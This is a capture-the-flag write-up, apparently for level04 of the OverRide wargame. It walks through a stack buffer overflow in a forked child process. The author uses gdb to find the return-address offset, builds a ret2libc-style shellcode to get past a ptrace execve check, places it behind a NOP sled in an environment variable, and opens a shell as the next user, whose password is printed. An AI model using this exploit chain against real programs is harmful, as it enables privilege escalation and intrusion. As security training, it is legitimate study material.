# We can overflow the child with get call to change the ret address

# Let's make gcc follow the child to analyse the segfault
# From gdb doc:
set follow-fork-mode mode
Set the debugger response to a program call of fork or vfork. A call to fork or vfork creates a new process. The mode argument can be:
-> parent
The original process is debugged after a fork. The child process runs unimpeded. This is the default.

-> child
The new process is debugged after a fork. The parent process runs unimpeded.

# Let's try to overflow the child
(gdb) set follow-fork-mode child
(gdb) r < <(python -c 'print "A"*500')
Starting program: /home/users/level04/level04 < <(python -c 'print "A"*500')
[New process 1956]
Give me some shellcode, k

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1956]
0x41414141 in ?? ()
(gdb) child is exiting...

# Find the offset
[...]
(gdb) r < <(python -c 'print "A"*157')
Starting program: /home/users/level04/level04 < <(python -c 'print "A"*157')
child is exiting...
[New process 2010]
Give me some shellcode, k
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2010]
0xf7e40041 in ?? () from /lib32/libc.so.6
[...]
(gdb) r < <(python -c 'print "A"*156')
Starting program: /home/users/level04/level04 < <(python -c 'print "A"*156')
[New process 2023]
Give me some shellcode, k
child is exiting...
[Inferior 18 (process 2024) exited normally]

# We can overwrite EIP at after 156 chars :)

============================================================================================================================

# Let's build the shellcode to export it in an env variable
# Note that we must use a ret2libc shellcode because ptrace is checking if ebx register contains the execve syscall number (0xb)
# So he denies it: puts("no exec() for you") ; kill(pid, 9)

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
(gdb) info func system
[...]
0xf7e6aed0  system
[...]

# https://defuse.ca/online-x86-assembler.htm#disassembly
Assembly
Raw Hex (zero bytes in bold):

String Literal:

"\x68\xEC\x97\xF8\xF7\x68\xEC\x97\xF8\xF7\x68\xD0\xAE\xE6\xF7\xC3"

Disassembly:
0:  68 ec 97 f8 f7          push   0xf7f897ec
5:  68 ec 97 f8 f7          push   0xf7f897ec
a:  68 d0 ae e6 f7          push   0xf7e6aed0
f:  c3                      ret

export SHELLCODE=$(python -c 'print "\x90"*64+"\x68\xEC\x97\xF8\xF7\x68\xEC\x97\xF8\xF7\x68\xD0\xAE\xE6\xF7\xC3"')

(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) x/50s *((char **)environ)
[...]
0xffffd8a2:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220h\354\227\370\367h\354\227\370\367hЮ\346\367", <incomplete sequence \303>
[...]
(gdb) x/bx 0xffffd8b0
0xffffd8b0:	0x90

0xffffd8b0 <- This is where we wanna jump, in the NOPsland

(gdb) b system
r < <(python -c 'print "A"*156+"\xb0\xd8\xff\xff"')
Breakpoint 3, 0xf7e6aed0 in system () from /lib32/libc.so.6
[New process 2086]
process 2086 is executing new program: /bin/dash

# Nice we jumped in our shellcode to open system(/bin/bash) :)

====================================================================================================================

# Let's try this in a real env

level04@OverRide:~$ export SHELLCODE=$(python -c 'print "\x90"*64+"\x68\xEC\x97\xF8\xF7\x68\xEC\x97\xF8\xF7\x68\xD0\xAE\xE6\xF7\xC3"')
level04@OverRide:~$ (python -c 'print "A"*156+"\xb0\xd8\xff\xff"'; cat ) | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
